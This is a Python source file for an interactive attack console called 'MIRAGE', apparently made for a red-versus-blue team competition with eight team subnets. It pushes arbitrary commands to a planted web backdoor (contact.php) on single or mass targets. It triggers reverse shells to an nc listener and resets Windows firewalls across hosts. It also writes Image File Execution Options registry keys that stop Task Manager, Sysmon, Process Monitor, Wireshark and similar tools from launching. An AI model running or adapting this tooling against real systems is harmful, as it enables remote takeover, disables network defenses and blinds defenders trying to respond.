import requests
import time
import json
import subprocess
import threading
import socket
from pyfiglet import Figlet
from rich.console import Console
from rich.text import Text
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
from rich.columns import Columns
from concurrent.futures import ThreadPoolExecutor, as_completed
from InquirerPy import inquirer
from InquirerPy.base.control import Choice
from InquirerPy.utils import get_style

ALL_HOSTS = [
    # Team 1
    "192.168.1.3", "192.168.1.4", "10.1.1.1", "10.1.1.2", "10.1.1.3",
    
    # Team 2
    "192.168.2.3", "192.168.2.4", "10.2.1.1", "10.2.1.2", "10.2.1.3",
    
    # Team 3
    "192.168.3.3", "192.168.3.4", "10.3.1.1", "10.3.1.2", "10.3.1.3",
    
    # Team 4
    "192.168.4.3", "192.168.4.4", "10.4.1.1", "10.4.1.2", "10.4.1.3",
    
    # Team 5
    "192.168.5.3", "192.168.5.4", "10.5.1.1", "10.5.1.2", "10.5.1.3",
    
    # Team 6
    "192.168.6.3", "192.168.6.4", "10.6.1.1", "10.6.1.2", "10.6.1.3",
    
    # Team 7
    "192.168.7.3", "192.168.7.4", "10.7.1.1", "10.7.1.2", "10.7.1.3",
    
    # Team 8
    "192.168.8.3", "192.168.8.4", "10.8.1.1", "10.8.1.2", "10.8.1.3",
]

ALL_DC = [
    # Domain Controllers - typically the .1 addresses in 10.X.1. subnet
    "10.1.1.1", "10.2.1.1", "10.3.1.1", "10.4.1.1", "10.5.1.1",
    "10.6.1.1", "10.7.1.1", "10.8.1.1",
]

ALL_SMB = [
    # SMB Hosts - typically the 192.168.X.3 addresses
    "192.168.1.3", "192.168.2.3", "192.168.3.3", "192.168.4.3", "192.168.5.3",
    "192.168.6.3", "192.168.7.3", "192.168.8.3",
]

ALL_IIS = [
    # IIS Hosts - typically the 192.168.X.4 addresses
    "192.168.1.4", "192.168.2.4", "192.168.3.4", "192.168.4.4", "192.168.5.4",
    "192.168.6.4", "192.168.7.4", "192.168.8.4",
]

ALL_WINRM = [
    # WinRM Hosts - typically the 10.X.1.2 addresses
    "10.1.1.2", "10.2.1.2", "10.3.1.2", "10.4.1.2", "10.5.1.2",
    "10.6.1.2", "10.7.1.2", "10.8.1.2",
]

ALL_ICMP = [
    # ICMP Hosts - typically the 10.X.1.3 addresses
    "10.1.1.3", "10.2.1.3", "10.3.1.3", "10.4.1.3", "10.5.1.3",
    "10.6.1.3", "10.7.1.3", "10.8.1.3",
]

PORT = 8080
TIMEOUT = 45
CONCURRENCY = 8
THROTTLE_MS = 50

console = Console() # For ASCII Art

matrix_style = get_style({
    "questionmark": "fg:#00FF00 bold",        # bright neon green
    "question": "fg:#00FF00 bold",
    "answer": "fg:#39FF14 bold",              # lime accent
    "pointer": "fg:#00FF00",                  # selection arrow
    "highlighted": "fg:#00FF00 bg:#003300",   # green text on dark green
    "selected": "fg:#ADFF2F",                 # yellow-green
    "separator": "fg:#006400",                # dark green line
    "instruction": "fg:#228B22",              # medium forest green
})

text_style = get_style({
    "questionmark": "fg:#00FF00 bold",       # neon green
    "answer": "fg:#39FF14 bold",             # your typed answer after submit
    "input": "fg:#00FF00",                   # text while typing
})

def ascii_art(text="MIRAGE", color="bright_green"):
    f = Figlet(font="poison")
    art = f.renderText(text).rstrip('\n')
    console.print(Text(art, style=color))

def get_all_local_ips():
    """Get all local IP addresses of the current machine"""
    local_ips = []
    
    try:
        # Get all network interfaces with names
        hostname = socket.gethostname()
        
        # Get all IP addresses associated with the hostname
        all_ips = socket.getaddrinfo(hostname, None)
        for addr_info in all_ips:
            ip = addr_info[4][0]
            if ip not in [ip_info[0] for ip_info in local_ips] and not ip.startswith('127.'):
                local_ips.append((ip, "Hostname Resolution"))
        
        # Also try to get IPs from network interfaces with names (if netifaces available)
        try:
            import netifaces
            interfaces = netifaces.interfaces()
            for interface in interfaces:
                addrs = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addrs:
                    for link in addrs[netifaces.AF_INET]:
                        ip = link['addr']
                        if ip not in [ip_info[0] for ip_info in local_ips] and not ip.startswith('127.'):
                            # Try to get interface description
                            interface_name = interface
                            # Common interface names mapping
                            if interface.startswith('eth'):
                                interface_name = f"Ethernet {interface[3:]}"
                            elif interface.startswith('wlan') or interface.startswith('wlp'):
                                interface_name = f"WiFi {interface[4:]}"
                            elif interface.startswith('en'):
                                interface_name = f"Ethernet {interface[2:]}"
                            elif interface.startswith('tailscale'):
                                interface_name = "Tailscale VPN"
                            elif interface.startswith('tun'):
                                interface_name = f"VPN Tunnel {interface[3:]}"
                            elif interface.startswith('docker'):
                                interface_name = "Docker Network"
                            elif interface == 'lo':
                                interface_name = "Loopback"
                            
                            local_ips.append((ip, interface_name))
        except ImportError:
            pass  # netifaces not available
        
    except:
        pass
    
    # Fallback methods
    try:
        # Try connecting to external service to get outgoing IP
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            outgoing_ip = s.getsockname()[0]
            if outgoing_ip not in [ip_info[0] for ip_info in local_ips]:
                local_ips.append((outgoing_ip, "Outgoing Connection"))
    except:
        pass
    
    # Add localhost as last resort
    if not local_ips:
        local_ips.append(("127.0.0.1", "Localhost"))
    else:
        # Ensure localhost is included
        if "127.0.0.1" not in [ip_info[0] for ip_info in local_ips]:
            local_ips.append(("127.0.0.1", "Localhost"))
    
    return local_ips

def select_local_ip():
    """Let user select which local IP to use"""
    local_ips = get_all_local_ips()
    
    if not local_ips:
        return "127.0.0.1"
    
    if len(local_ips) == 1:
        return local_ips[0][0]
    
    # Create choices for each IP with interface names
    choices = []
    for ip, interface_name in local_ips:
        # Add description based on IP type
        if ip.startswith('10.') or ip.startswith('192.168.') or (ip.startswith('172.') and 16 <= int(ip.split('.')[1]) <= 31):
            network_type = "Private"
        elif ip.startswith('127.'):
            network_type = "Loopback"
        elif ip.startswith('169.254.'):
            network_type = "Link-local"
        else:
            network_type = "Public"
        
        choices.append(Choice(
            value=ip, 
            name=f"{ip} - {interface_name} ({network_type})"
        ))
    
    # Add exit option
    choices.append(Choice(value=None, name="Exit"))
    
    print("\n=== Network Interface Selection ===")
    selected_ip = inquirer.select(
        message="Select network interface to use:",
        choices=choices,
        style=matrix_style,
        pointer=">>",
        instruction="(Use ↑↓ arrows, Enter to select)",
        default=choices[0].value if choices else None
    ).execute()
    
    if selected_ip is None:
        print("Exiting...")
        exit(0)
    
    return selected_ip

def send_command(client, port, command):
    url = f"http://{client}:{port}/contact.php"
    
    # Send as form data
    data = {"input_word": command}
    
    try:
        # Using form data approach
        r = requests.post(url, data=data, timeout=TIMEOUT)
        clean_text = r.text.replace('<pre>', '').replace('</pre>', '')
        return (client, r.status_code, clean_text)
    except Exception as e:
        return (client, "ERR", str(e))
        
def spawn_reverse_shell(client, port, attacker_ip, attacker_port):
    url = f"http://{client}:{port}/search.php"
    command = f"search {attacker_ip} {attacker_port}"
    data = {"input_word": command}
    
    try:
        # Use a very short timeout - we just need to trigger the request
        r = requests.post(url, data=data, timeout=2)
        # If we get here, we got an HTTP response (unexpected for reverse shell)
        return (r.status_code, "Reverse Shell Triggered")
    except requests.exceptions.Timeout:
        # Timeout is EXPECTED - this means the reverse shell is running
        return ("SUCCESS", "Reverse shell connected (timeout expected)")
    except Exception as e:
        return ("ERR", str(e))
        
def start_listener(ip, port):
    def listener():
        try:
            subprocess.run(f"nc -l {ip} {port}", shell=True)
        except Exception as e:
            print(f"Listener error: {e}")
    thread = threading.Thread(target=listener, daemon=True)
    thread.start()
    return thread
    
def main_interface():
    action = inquirer.select(
        message="Select an action:",
        choices=[
            Choice(value="SINGULAR", name="Singular Remote Code Execution"),
            Choice(value="MASS", name="Mass Remote Code Execution"),
            Choice(value="SHELL", name="Spawn a Reverse Shell"),
            Choice(value="FIREWALL", name="Reset Firewalls"),
            Choice(value="IFEO", name="Set IFEO Registry Keys"),
            Choice(value="CALLBACK", name="Test Connections"),
            Choice(value=None, name="Exit"),
        ],
        default="SINGULAR",
        style=matrix_style,
        pointer=">>",
        instruction="(Use ↑↓ arrows, Enter to select)"
    ).execute()
    return action
    
def choose_targets():
    choice = inquirer.select(
        message="Which group would you like to target?",
        choices=[
            Choice(value="ALL_HOSTS", name="All Hosts"),
            Choice(value="ALL_DC", name="All Domain Controllers"),
            Choice(value="ALL_IIS", name="All IIS Hosts"),
            Choice(value="ALL_WINRM", name="All WinRM Hosts"),
            Choice(value="ALL_ICMP", name="All ICMP Hosts"),
            Choice(value="ALL_SMB", name="All SMB Hosts"),
            Choice(value="CUSTOM", name="Custom (Enter Comma-Separated List)"),
            Choice(value=None, name="Cancel"),
        ],
        style=matrix_style,
        pointer=">>",
        instruction="(Use ↑↓ arrows, Enter to select)"
    ).execute()
    
    if not choice:
        return []

    if choice == "CUSTOM":
        while True:
            text = inquirer.text(
                message="Enter Comma-Separated Targets (e.g. 192.168.1.1,192.168.1.2):",
                style=text_style
            ).execute()
            if not text:
                return []
            
            targets = [t.strip() for t in text.split(",") if t.strip()]
            
            # Validate all IPs are in ALL_HOSTS
            invalid_ips = [ip for ip in targets if ip not in ALL_HOSTS]
            
            if invalid_ips:
                print(f"❌ Invalid target IPs: {', '.join(invalid_ips)}")
                retry = inquirer.confirm(
                    message="Would you like to try again?", 
                    default=True,
                    style=text_style
                ).execute()
                if not retry:
                    return []
            else:
                return targets

    mapping = {
        "ALL_HOSTS": ALL_HOSTS,
        "ALL_DC": ALL_DC,
        "ALL_IIS": ALL_IIS,
        "ALL_WINRM": ALL_WINRM,
        "ALL_ICMP": ALL_ICMP,
        "ALL_SMB": ALL_SMB,
    }
    return mapping.get(choice, [])
    
def run_threads(clients, port, command, action_type="command", attacker_ip=None, attacker_port=None):
    console.print(f"\n[bold #00ff00]Executing on {len(clients)} targets...[/bold #00ff00]")
    console.print("=" * 60)
    
    results = []
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TaskProgressColumn(),
        console=console,
        transient=True,
    ) as progress:
        
        main_task = progress.add_task(f"[#00ff00]Processing {len(clients)} targets...", total=len(clients))
        
        with ThreadPoolExecutor(max_workers=CONCURRENCY) as ex:
            futures = {}
            for client in clients:
                if action_type == "command":
                    future = ex.submit(send_command, client, port, command)
                else:  # shell
                    future = ex.submit(spawn_reverse_shell, client, port, attacker_ip, attacker_port)
                futures[future] = client
                time.sleep(THROTTLE_MS / 1000.0)
            
            for future in as_completed(futures):
                client = futures[future]
                try:
                    result = future.result()
                    if action_type == "command":
                        target, status, response = result
                    else:
                        # spawn_reverse_shell returns different format
                        if len(result) == 3:
                            target, status, response = result
                        else:
                            status, response = result
                            target = client
                    
                    # Determine status color and icon
                    if status == 200 or status == "SUCCESS":
                        status_color = "#00ff00"  # Green
                        status_icon = "✅"
                        status_text = "SUCCESS"
                    elif isinstance(status, int) and 400 <= status < 600:
                        status_color = "#ff0000"  # Red
                        status_icon = "❌"
                        status_text = f"ERROR {status}"
                    else:
                        status_color = "#ffff00"  # Yellow
                        status_icon = "⚠️"
                        status_text = f"FAILED: {status}"
                    
                    results.append({
                        "target": target,
                        "status": status_text,
                        "color": status_color,
                        "icon": status_icon,
                        "response": response
                    })
                    
                except Exception as e:
                    results.append({
                        "target": client,
                        "status": f"EXCEPTION: {str(e)}",
                        "color": "#ff0000",
                        "icon": "💥",
                        "response": ""
                    })
                
                progress.update(main_task, advance=1)
    
    # Display results in a beautiful way
    display_results(results, action_type)

def display_results(results, action_type):
    """Display results in a visually appealing format"""
    
    # Sort results by IP address (lowest to highest)
    def ip_sort_key(ip_str):
        try:
            parts = ip_str.split('.')
            return tuple(int(part) for part in parts)
        except (ValueError, AttributeError):
            return (999, 999, 999, 999)

    sorted_results = sorted(results, key=lambda x: ip_sort_key(x["target"]))
    
    # Summary statistics
    success_count = sum(1 for r in sorted_results if r["color"] == "#00ff00")
    warning_count = sum(1 for r in sorted_results if r["color"] == "#ffff00")
    error_count = sum(1 for r in sorted_results if r["color"] == "#ff0000")
    
    # Create summary panel
    summary_text = Text()
    summary_text.append(f"✅ {success_count} successful", style="#00ff00")
    summary_text.append(" | ")
    summary_text.append(f"⚠️ {warning_count} warnings", style="#ffff00") 
    summary_text.append(" | ")
    summary_text.append(f"❌ {error_count} failed", style="#ff0000")
    
    summary_panel = Panel(
        summary_text,
        title="[bold #00ff00]Execution Summary[/bold #00ff00]",
        border_style="#00ff00"
    )
    console.print(summary_panel)
    
    # Calculate dynamic sizing based on terminal
    terminal_width = console.size.width
    
    # Determine optimal columns per row based on terminal width
    if terminal_width >= 160:
        columns_per_row = 4
    elif terminal_width >= 120:
        columns_per_row = 3
    elif terminal_width >= 80:
        columns_per_row = 2
    else:
        columns_per_row = 1
    
    panel_width = min(55, max(35, (terminal_width - (columns_per_row * 3)) // columns_per_row))
    
    # Create result panels with dynamic sizing
    result_panels = []
    for result in sorted_results:
        content = Text()
        content.append(f"Target: {result['target']}\n", style="bold white")
        content.append(f"Status: ", style="bold")
        content.append(f"{result['status']}\n", style=result['color'])
        
        if action_type == "command" and result["response"] and result["color"] == "#00ff00":
            lines = result["response"].strip().split('\n')
            preview_lines = []
            total_chars = 0
            max_preview_chars = (panel_width - 10) * 3
            
            for line in lines:
                if total_chars + len(line) <= max_preview_chars:
                    preview_lines.append(line)
                    total_chars += len(line)
                else:
                    remaining_chars = max_preview_chars - total_chars
                    if remaining_chars > 10:
                        preview_lines.append(line[:remaining_chars-3] + "...")
                    break
            
            if preview_lines:
                content.append("Response:\n", style="bold")
                for line in preview_lines:
                    if len(line) > panel_width - 5:
                        line = line[:panel_width-8] + "..."
                    content.append(f"{line}\n", style="#CCCCCC")
    
        panel = Panel(
            content,
            title=f"{result['icon']} {result['target']}",
            border_style=result['color'],
            width=panel_width,
            padding=(1, 2),
            expand=False
        )
        result_panels.append(panel)
    
    # Display in dynamic columns
    if result_panels:
        console.print(f"\n[bold #00ff00]Quick Overview ({columns_per_row} per row):[/bold #00ff00]")
        
        for i in range(0, len(result_panels), columns_per_row):
            row_panels = result_panels[i:i + columns_per_row]
            columns = Columns(row_panels, width=panel_width, expand=False, equal=True)
            console.print(columns)
            console.print()
    
    # Always show detailed output option
    if sorted_results:
        show_details = inquirer.confirm(
            message="Show detailed output with complete responses?",
            default=True,
            style=text_style
        ).execute()
        
        if show_details:
            # Organize by status sections
            successful_results = [r for r in sorted_results if r["color"] == "#00ff00"]
            warning_results = [r for r in sorted_results if r["color"] == "#ffff00"]
            error_results = [r for r in sorted_results if r["color"] == "#ff0000"]
            
            # Calculate dynamic line lengths based on terminal width
            line_length = min(100, terminal_width - 4)
            single_line = "─" * line_length
            double_line = "═" * line_length
            
            # Main header
            console.print("\n")
            console.print(Panel(
                f"[bold #00ff00]COMPLETE DETAILED OUTPUT[/bold #00ff00]\n"
                f"[white]Total Targets: {len(sorted_results)} | "
                f"Successful: {success_count} | "
                f"Warnings: {warning_count} | "
                f"Failed: {error_count}[/white]",
                border_style="#00ff00",
                padding=(1, 2)
            ))
            
            # Successful results section
            if successful_results:
                console.print(f"\n{double_line}")
                console.print("[bold #00ff00]✅ SUCCESSFUL EXECUTIONS[/bold #00ff00]")
                console.print(f"{double_line}")
                
                for i, result in enumerate(successful_results):
                    if i > 0:
                        console.print(f"\n{single_line}\n")
                    
                    # Make target IP stand out with background and border
                    console.print(Panel(
                        f"[bold #00ff00]🎯 TARGET: {result['target']}[/bold #00ff00]",
                        border_style="#00ff00",
                        width=line_length,
                        padding=(0, 1)
                    ))
                    
                    console.print(f"[bold white]Status:[/bold white] [#00ff00]{result['status']}[/#00ff00]")
                    
                    if action_type == "command" and result["response"]:
                        console.print(f"\n[bold white]Full Response:[/bold white]")
                        console.print(Panel(
                            f"[#CCCCCC]{result['response']}[/#CCCCCC]",
                            border_style="#00ff00",
                            width=line_length,
                            padding=(1, 2)
                        ))
            
            # Warning results section
            if warning_results:
                console.print(f"\n{double_line}")
                console.print("[bold #ffff00]⚠️  WARNINGS & PARTIAL SUCCESS[/bold #ffff00]")
                console.print(f"{double_line}")
                
                for i, result in enumerate(warning_results):
                    if i > 0:
                        console.print(f"\n{single_line}\n")
                    
                    console.print(Panel(
                        f"[bold #ffff00]🎯 TARGET: {result['target']}[/bold #ffff00]",
                        border_style="#ffff00",
                        width=line_length,
                        padding=(0, 1)
                    ))
                    
                    console.print(f"[bold white]Status:[/bold white] [#ffff00]{result['status']}[/#ffff00]")
                    
                    if action_type == "command" and result["response"]:
                        console.print(f"\n[bold white]Response:[/bold white]")
                        console.print(Panel(
                            f"[#CCCCCC]{result['response']}[/#CCCCCC]",
                            border_style="#ffff00",
                            width=line_length,
                            padding=(1, 2)
                        ))
            
            # Error results section
            if error_results:
                console.print(f"\n{double_line}")
                console.print("[bold #ff0000]❌ FAILED EXECUTIONS[/bold #ff0000]")
                console.print(f"{double_line}")
                
                for i, result in enumerate(error_results):
                    if i > 0:
                        console.print(f"\n{single_line}\n")
                    
                    console.print(Panel(
                        f"[bold #ff0000]🎯 TARGET: {result['target']}[/bold #ff0000]",
                        border_style="#ff0000",
                        width=line_length,
                        padding=(0, 1)
                    ))
                    
                    console.print(f"[bold white]Status:[/bold white] [#ff0000]{result['status']}[/#ff0000]")
                    
                    if action_type == "command" and result["response"]:
                        console.print(f"\n[bold white]Error Details:[/bold white]")
                        console.print(Panel(
                            f"[#CCCCCC]{result['response']}[/#CCCCCC]",
                            border_style="#ff0000",
                            width=line_length,
                            padding=(1, 2)
                        ))
            
            # Final summary (simple listing at bottom)
            console.print(f"\n{double_line}")
            console.print("[bold #00ff00]📊 FINAL SUMMARY[/bold #00ff00]")
            console.print(f"{double_line}")
            console.print(f"[#00ff00]✅ Successful: {success_count} targets[/#00ff00]")
            console.print(f"[#ffff00]⚠️ Warnings:  {warning_count} targets[/#ffff00]")
            console.print(f"[#ff0000]❌ Failed:    {error_count} targets[/#ff0000]")
            console.print(f"[bold white]📋 Total:     {len(sorted_results)} targets processed[/bold white]")
            console.print(f"{double_line}")

def singular_execution():
    while True:
        target = inquirer.text(
            message="Enter target IP:",
            style=text_style
        ).execute()
        
        if not target:
            print("No target specified")
            return

        # Check if target is in ALL_HOSTS
        if target not in ALL_HOSTS:
            print(f"❌ {target} is not a valid target IP")
            retry = inquirer.confirm(
                message="Would you like to try a different IP?", 
                default=False,
                style=text_style,
                transformer=lambda x: "y" if x else "n"
            ).execute()
            if not retry:
                return
            continue  # Ask for IP again
        
        break  # Valid IP found
    
    command = inquirer.text(
        message="Enter command to execute:",
        style=text_style
    ).execute()
    
    if not command:
        print("No command specified")
        return
    
    console.print(f"\n[bold #00ff00]Sending command to {target}...[/bold #00ff00]")
    console.print("=" * 60)
    
    # Show progress for single execution
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TaskProgressColumn(),
        console=console,
        transient=True,
    ) as progress:
        
        task = progress.add_task(f"[#00ff00]Executing on {target}...", total=1)
        result = send_command(target, PORT, command)
        progress.update(task, advance=1)
    
    target, status, response = result
    
    # Determine status color and icon
    if status == 200:
        status_color = "#00ff00"
        status_icon = "✅"
        status_text = "SUCCESS"
    elif isinstance(status, int) and 400 <= status < 600:
        status_color = "#ff0000"
        status_icon = "❌"
        status_text = f"ERROR {status}"
    else:
        status_color = "#ffff00"
        status_icon = "⚠️"
        status_text = f"FAILED: {status}"
    
    # Calculate dynamic line length based on terminal width
    terminal_width = console.size.width
    line_length = min(100, terminal_width - 4)
    double_line = "═" * line_length
    
    # Display results in a detailed box
    console.print(f"\n{double_line}")
    console.print("[bold #00ff00]SINGLE TARGET EXECUTION RESULTS[/bold #00ff00]")
    console.print(f"{double_line}")
    
    # Target header
    console.print(Panel(
        f"[bold #00ff00]🎯 TARGET: {target}[/bold #00ff00]",
        border_style="#00ff00",
        width=line_length,
        padding=(0, 1)
    ))
    
    # Status and command
    console.print(f"\n[bold white]Status:[/bold white] [{status_color}]{status_text}[/{status_color}]")
    
    # Response in a panel
    if response:
        console.print(f"\n[bold white]Full Response:[/bold white]")
        console.print(Panel(
            f"[#CCCCCC]{response}[/#CCCCCC]",
            border_style=status_color,
            width=line_length,
            padding=(1, 2)
        ))
    
    # Final separator
    console.print(f"\n{double_line}")
    console.print(f"{double_line}")

def mass_execution(command=None):
    targets = choose_targets()
    if not targets:
        print("No targets selected")
        return

    if command == None:
        command = inquirer.text(
            message="Enter command to execute on all targets:",
            style=text_style
        ).execute()

    if not command:
        print("No command entered")
        return
    
    print(f"\nTargeting {len(targets)} hosts with command: {command}")
    confirm = inquirer.confirm(
        message="Proceed?", 
        default=True,
        style=text_style
    ).execute()
    if not confirm:
        return
    
    run_threads(targets, PORT, command, "command")

def shell_execution(selected_ip):
    # For shell spawning, only allow single target selection
    print("\n=== Reverse Shell Setup ===")
    
    # Get single target
    while True:
        target = inquirer.text(
            message="Enter target IP:",
            style=text_style
        ).execute()
        
        if not target:
            print("No target specified")
            return
        
        # Check if target is in ALL_HOSTS
        if target not in ALL_HOSTS:
            print(f"❌ {target} is not a valid target IP")
            retry = inquirer.confirm(
                message="Would you like to try a different IP?", 
                default=True,
                style=text_style
            ).execute()
            if not retry:
                return
            continue  # Ask for IP again
        
        break  # Valid IP found
    
    # Get listener details
    listener_ip = inquirer.text(
        message="Listener IP:", 
        default=selected_ip,
        style=text_style
    ).execute()
    
    listener_port = inquirer.text(
        message="Listener port:", 
        default="6767",
        style=text_style
    ).execute()
    
    confirm = inquirer.confirm(
        message=f"Trigger reverse shell from {target} to {listener_ip}:{listener_port}?", 
        default=True,
        style=text_style
    ).execute()
    
    if not confirm:
        return
    
    # Start listener
    print(f"Starting listener on {listener_ip}:{listener_port}...")
    listener_thread = start_listener(listener_ip, listener_port)
    time.sleep(1)
    
    # Trigger the reverse shell
    print(f"Triggering reverse shell on {target}...")
    status, response = spawn_reverse_shell(target, PORT, listener_ip, listener_port)
    
    if status in ["SUCCESS", 200]:  # Check for both SUCCESS and 200
        try:
            listener_thread.join()
        except KeyboardInterrupt:
            print("\nStopped by user")
    else:
        print("❌ Failed to trigger reverse shell")
        print(f"Provided Error: {response}")
        listener_thread.join(timeout=1)

def main():
    subprocess.run("clear")
    ascii_art()
    
    # Show local IP at startup
    selected_ip = select_local_ip()
    print()
    
    while True:
        action = main_interface()
        if action is None:
            print("Goodbye.")
            break
            
        if action == "SINGULAR":
            singular_execution()
        elif action == "MASS":
            mass_execution()
        elif action == "SHELL":
            shell_execution(selected_ip)
        elif action == "FIREWALL":
            command = "netsh advfirewall reset"
            mass_execution(command)
        elif action == "IFEO":
            command = "for %i in (wireshark.exe taskmgr.exe autoruns.exe autoruns64.exe procexp.exe procexp64.exe procmon.exe procmon64.exe strings.exe strings64.exe Sysmon.exe Sysmon64.exe tcpview.exe tcpview64.exe) do @reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%i\" /v Debugger /t REG_SZ /d \"conhost.exe\""
            mass_execution(command)
        elif action == "CALLBACK":
            command = "rem"
            mass_execution(command)
        else:
            print("Unknown action, returning to menu.")
        
        print()  # Empty line for readability

if __name__ == "__main__":
    main()
